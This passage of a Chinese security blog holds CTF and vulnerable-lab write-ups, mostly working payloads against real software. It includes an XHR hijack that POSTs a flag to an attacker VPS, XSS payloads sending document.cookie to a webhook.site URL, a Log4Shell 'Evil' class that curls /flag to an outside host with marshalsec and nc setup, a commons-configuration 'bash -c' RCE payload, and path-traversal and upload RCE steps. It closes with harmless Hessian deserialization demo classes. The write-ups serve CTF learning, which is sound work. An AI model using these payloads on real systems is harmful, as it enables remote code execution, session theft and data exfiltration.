<h2 id="LITCTF-2023-fetch"><a href="#LITCTF-2023-fetch" class="headerlink" title="LITCTF 2023 fetch"></a>LITCTF 2023 fetch</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">runHTMLFile</span> = <span class="keyword">async</span> (<span class="params">filePath</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>();</span><br><span class="line">  <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>();</span><br><span class="line">  <span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="string">`file:<span class="subst">$&#123;filePath&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">await</span> page.evaluate(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> req = <span class="keyword">new</span> <span class="variable language_">window</span>.<span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    req.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://flag:6969/&quot;</span> + randomString, <span class="literal">false</span>);</span><br><span class="line">    req.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">const</span> screenshot = <span class="keyword">await</span> page.<span class="title function_">screenshot</span>(&#123;</span><br><span class="line">    <span class="attr">path</span>: filePath.<span class="title function_">replace</span>(<span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.png&quot;</span>),</span><br><span class="line">    <span class="attr">fullPage</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&quot;png&quot;</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">await</span> browser.<span class="title function_">close</span>();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> filePath.<span class="title function_">replace</span>(<span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.png&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>filePath是我们上传的文件，传入一个html文件，page.goto会访问这个文件，page.evaluate会在访问这个页面的基础上执行里面的代码，也就是访问flag文件<br>只需要将window.XMLHttpRequest给重写了，就可以得到flag<br>wp<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, World!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">const</span> originalXHR = <span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title function_">originalXHR</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> originalOpen = xhr.<span class="property">open</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  xhr.<span class="property">open</span> = <span class="keyword">function</span>(<span class="params">method, url, <span class="keyword">async</span>, user, password</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">return</span> originalOpen.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> originalOnReadyStateChange = xhr.<span class="property">onreadystatechange</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">if</span> (xhr.<span class="property">readyState</span> === <span class="number">4</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;XHR请求的responseText：&#x27;</span>, xhr.<span class="property">responseText</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">let</span> callback = <span class="keyword">new</span> <span class="title function_">originalXHR</span>()</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    callback.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;http://vps:port/recv&quot;</span>,<span class="literal">false</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    callback.<span class="title function_">send</span>(xhr.<span class="property">responseText</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">if</span> (originalOnReadyStateChange) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      originalOnReadyStateChange.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">return</span> xhr;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>onreadystatechange是用于监听 XMLHttpRequest 对象状态改变事件的属性。当XMLHttpRequest的状态发生了改变，就会触发绑定在onreadystatechange上的函数，当readState=4时，代表请求已完成，且响应已就绪。<br>这时候在其中把获取到的flag转发到自己的vps上面，当然也可以直接document.write到页面上，因为runHTMLFile会将页面的截图保存并返回。</p>
<h2 id="imaginary-ctf-2023-unsanitizer"><a href="#imaginary-ctf-2023-unsanitizer" class="headerlink" title="imaginary ctf 2023 unsanitizer"></a>imaginary ctf 2023 unsanitizer</h2><h3 id="unintended"><a href="#unintended" class="headerlink" title="unintended"></a>unintended</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	res.<span class="title function_">type</span>(<span class="string">&#x27;text&#x27;</span>).<span class="title function_">send</span>(<span class="string">`Page <span class="subst">$&#123;req.path&#125;</span> not found`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>在这一段因为req.path是可控的，但是如果输入尖括号等特殊符号会被url编码，导致无法利用，一般这种情况下就需要想想能不能让这个回显的内容加载进script标签中，或者直接让他进入js文件中<br>下面的payload，就可以让他加入js文件中<br><code>127.0.0.1:3000/1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//..%2findex.xhtml#http://127.0.0.1:8000</code><br>将这段放到浏览器的时候，浏览器会把他当做目录为<br><code>1;var[Page]=[1];location=location.hash.slice(1)+document.cookie</code><br>文件名为<br><code>..%2findex.xhtml</code><br>去浏览<br><img src="/2023/09/06/%E5%89%8D%E7%AB%AFctf/1.png" alt><br>但是后端会去解析%2f也就是说后端会去返回直接index.xhtml<br>浏览器接收到以后会直接去解析index.xhtml中的内容<br>那么里面的main.js也会被请求为<br><code>http://127.0.0.1:3000/1;location=location.hash.slice(1)+document.cookie//main.js</code><br><img src="/2023/09/06/%E5%89%8D%E7%AB%AFctf/2.png" alt><br>因为开头的那段404代码会被uri所控制，所以就变成了<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Page</span> /<span class="number">1</span>;<span class="keyword">var</span>[<span class="title class_">Page</span>]=[<span class="number">1</span>];location=location.<span class="property">hash</span>.<span class="title function_">slice</span>(<span class="number">1</span>)+<span class="variable language_">document</span>.<span class="property">cookie</span><span class="comment">//main.js not found</span></span><br></pre></td></tr></table></figure><br><img src="/2023/09/06/%E5%89%8D%E7%AB%AFctf/3.png" alt><br>最后就直接跳转到#后面的url了</p>
<h3 id="intended"><a href="#intended" class="headerlink" title="intended"></a>intended</h3><ul>
<li>看到下面的代码，可以发现style标签下的尖括号是不会被转义的<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(<span class="string">&quot;&lt;div&gt;&lt;style&gt;a&lt;&lt;/style&gt;&lt;/div&gt;&quot;</span>)</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="comment">//&lt;div&gt;&lt;style&gt;a&lt;&lt;/style&gt;&lt;/div&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(<span class="string">&quot;&lt;svg&gt;aa&gt;&lt;/svg&gt;&quot;</span>)</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="comment">//&lt;svg&gt;aa&amp;gt;&lt;/svg&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>base的用法<br>href中输入abc，那么之后的所有访问都会基于<a href="http://target/abc/">http://target/abc/</a><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;base href=<span class="string">&quot;/abc/&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>接下来看到作者的payload<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;url&quot;</span>&gt;</span>https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    &lt;![CDATA[<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-x</span>=<span class="string">&quot;]]＞&lt;/style&gt;</span></span></span><span class="language-xml"><span class="tag"><span class="string">&lt;iframe name=&#x27;Page&#x27; /&gt;</span></span></span><span class="language-xml"><span class="tag"><span class="string">&lt;base href=&#x27;/**/+location.assign(document.all.url.textContent+document.cookie)//&#x27; /&gt;</span></span></span><span class="language-xml"><span class="tag"><span class="string">&lt;style&gt;&lt;!--&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span>--&gt;<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span>&lt;/div&gt;</span><br></pre></td></tr></table></figure><br>在xhtml中<code>&lt;![CDATA[XXXX]]&gt;</code>用于注释<br>利用xhtml和html的不同解析标准，在xhtml中就会变成下面这样<br><figure class="highlight xhtml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;url&quot;</span>&gt;</span>https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span>/*&lt;![CDATA[<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-x</span>=<span class="string">&quot;]]*/＞&lt;/style&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">  &lt;iframe name=&#x27;Page&#x27; /&gt;&lt;base href=&#x27;/**/+location.assign(document.all.url.textContent+document.cookie)//&#x27; /&gt;&lt;style&gt;&lt;!--&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>--&gt;<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><br>跟unintended的思路一样，也是利用了会去加载其他js文件，且文件路径可控</p>
<h2 id="sekai-ctf-golf-jail"><a href="#sekai-ctf-golf-jail" class="headerlink" title="sekai ctf golf-jail"></a>sekai ctf golf-jail</h2>]]></content>
      <categories>
        <category>前端安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>ctf</tag>
        <tag>javascript</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>春秋云镜CVE</title>
    <url>/2023/08/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCVE/</url>
    <content><![CDATA[<h1 id="CVE系列"><a href="#CVE系列" class="headerlink" title="CVE系列"></a>CVE系列</h1><p>不详细讲原理，只发一下poc<br><span id="more"></span></p>
<h2 id="CVE-2021-44228"><a href="#CVE-2021-44228" class="headerlink" title="CVE-2021-44228"></a>CVE-2021-44228</h2><p>log4j<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;curl -X POST -F xx=@/flag  http://xx：8999&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>先运行marshalsec<br><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://xx:8000/#Evil&quot; 1099</code></p>
<p>同时需要在8000端口起个web服务<br><code>python3 -m http.server 8000</code></p>
<p>要在8999端口起个nc，用于接受flag<br><code>nc -lvp 8999</code></p>
<p>输入框输入<br><code>$&#123;jndi:ldap://xx:1099/evil&#125;</code></p>
<p>不知道为什么不可以反弹shell，就直接用curl了</p>
<h2 id="CVE-2022-33980"><a href="#CVE-2022-33980" class="headerlink" title="CVE-2022-33980"></a>CVE-2022-33980</h2><p>payload<br><code>Url?url=http://xx:8000/test.xml&amp;data=path</code></p>
<p>test.xml<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">path</span>&gt;</span>$&#123;script:js:java.lang.Runtime.getRuntime().exec(&quot;bash -c &#123;xxx&#125;&quot;)&#125;<span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><br>直接弹shell</p>
<blockquote>
<p><code>$&#123;url:utf-8:file:///&#125;</code>可以用于读取目录<br><code>$&#123;url:utf-8:file:///flag&#125;</code>可以用于读取文件</p>
</blockquote>
<h2 id="CVE-2022-25101"><a href="#CVE-2022-25101" class="headerlink" title="CVE-2022-25101"></a>CVE-2022-25101</h2><p><a href="http://eci-2zec563boh9uafe744jn.cloudeci1.ichunqiu.com/admin/login/">http://eci-2zec563boh9uafe744jn.cloudeci1.ichunqiu.com/admin/login/</a><br><code>admin
123456</code><br>进入后台<br><img src="/2023/08/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCVE/1.png" alt><br>install处选择一个压缩包，其中要有info.php，info.php写入你的payload即可<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$archive</span> = <span class="keyword">new</span> <span class="title class_">PclZip</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// extract Add-on files into WBCE temp folder</span></span><br><span class="line"><span class="variable">$addon_root_path</span> = <span class="title function_ invoke__">find_addon_root_path</span>(<span class="variable">$archive</span>);</span><br><span class="line"><span class="variable">$list</span> = <span class="variable">$archive</span>-&gt;<span class="title function_ invoke__">extract</span>(</span><br><span class="line">    PCLZIP_OPT_PATH,</span><br><span class="line">    <span class="variable">$temp_unzip</span>,</span><br><span class="line">    PCLZIP_CB_PRE_EXTRACT,</span><br><span class="line">    <span class="string">&#x27;pclzip_extraction_filter&#x27;</span>,</span><br><span class="line">    PCLZIP_OPT_REPLACE_NEWER</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if uploaded file is a valid Add-On zip file</span></span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$list</span> &amp;&amp; <span class="title function_ invoke__">file_exists</span>(<span class="variable">$temp_unzip</span> . <span class="string">&#x27;info.php&#x27;</span>))) &#123;</span><br><span class="line">    <span class="variable">$admin</span>-&gt;<span class="title function_ invoke__">print_error</span>(<span class="variable">$MESSAGE</span>[<span class="string">&#x27;GENERIC_INVALID_ADDON_FILE&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Include the templates info file</span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$template_directory</span>);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$theme_directory</span>);</span><br><span class="line"><span class="keyword">require</span>(<span class="variable">$temp_unzip</span> . <span class="string">&#x27;info.php&#x27;</span>);</span><br></pre></td></tr></table></figure><br>看看部分源码，可以看到他把压缩包的内容解压出来，然后require了info.php</p>
<h2 id="CVE-2021-44665"><a href="#CVE-2021-44665" class="headerlink" title="CVE-2021-44665"></a>CVE-2021-44665</h2><p>searchsploit相应的payload即可<br>把<br><code>../../database</code><br>改为<br><code>../../../../../../flag</code><br>即可<br>原理大概就是有一处insert的sql操作没有鉴权，可以用于添加相应的id，然后在getfile.php中可以获取到该id，绕过鉴权，并且他读取文件的操作没有过滤../，具体原理可以自行分析</p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>php</tag>
        <tag>cve</tag>
        <tag>靶场</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>codeql</title>
    <url>/2023/08/06/codeql/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>hessian反序列化</title>
    <url>/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h2 id="入门Hessian反序列化"><a href="#入门Hessian反序列化" class="headerlink" title="入门Hessian反序列化"></a>入门Hessian反序列化</h2><span id="more"></span>
<h3 id="People"><a href="#People" class="headerlink" title="People"></a>People</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">People</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student getId call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student setId call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student getName call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student setName call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Student"><a href="#Student" class="headerlink" title="Student"></a>Student</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">People</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="number">111</span>, <span class="string">&quot;xxx&quot;</span>, <span class="string">&quot;ggg&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> String gender;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, Class&lt;Object&gt;&gt; innerMap;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Student&gt; friends;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFriends</span><span class="params">(List&lt;Student&gt; friends)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student setFriends call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.friends = friends;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getFriends</span><span class="params">(List&lt;Student&gt; friends)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student getFriends call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.friends = friends;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Map <span class="title function_">getInnerMap</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student getInnerMap call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> innerMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setInnerMap</span><span class="params">(Map innerMap)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student setInnerMap call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.innerMap = innerMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getGender</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student getGender call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setGender</span><span class="params">(String gender)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student setGender call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.gender = gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student default constructor call&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(<span class="type">int</span> id, String name, String gender)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student custom constructor call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.gender = gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ObjectInputStream)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student readObject call&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Object <span class="title function_">readResolve</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student readResolve call&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> student;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student hashCode call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student finalize call&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">super</span>.finalize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Student&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, gender=&#x27;&quot;</span> + gender + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, innerMap=&quot;</span> + innerMap +</span><br><span class="line">                <span class="string">&quot;, friends=&quot;</span> + friends +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
